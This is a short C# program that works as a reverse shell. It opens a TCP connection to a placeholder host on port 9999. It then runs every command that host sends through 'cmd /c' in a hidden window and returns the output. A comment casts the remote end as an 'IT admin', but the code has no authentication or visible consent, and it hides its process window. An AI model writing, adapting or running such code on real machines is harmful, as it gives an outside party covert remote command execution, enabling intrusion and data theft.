using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;

class ClientApp
{
    static void Main()
    {
        TcpClient client = new TcpClient("IP_ADDRESS_HERE", 9999); // Replace with the IT admin's IP
        NetworkStream stream = client.GetStream();
        byte[] buffer = new byte[1024];

        while (true)
        {
            int bytesRead = stream.Read(buffer, 0, buffer.Length);
            string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);

            if (command.ToLower() == "exit")
            {
                break;
            }

            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + command)
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            Process proc = new Process
            {
                StartInfo = procStartInfo
            };

            proc.Start();
            string output = proc.StandardOutput.ReadToEnd();

            byte[] outputBytes = Encoding.ASCII.GetBytes(output);
            stream.Write(outputBytes, 0, outputBytes.Length);
        }

        client.Close();
    }
}
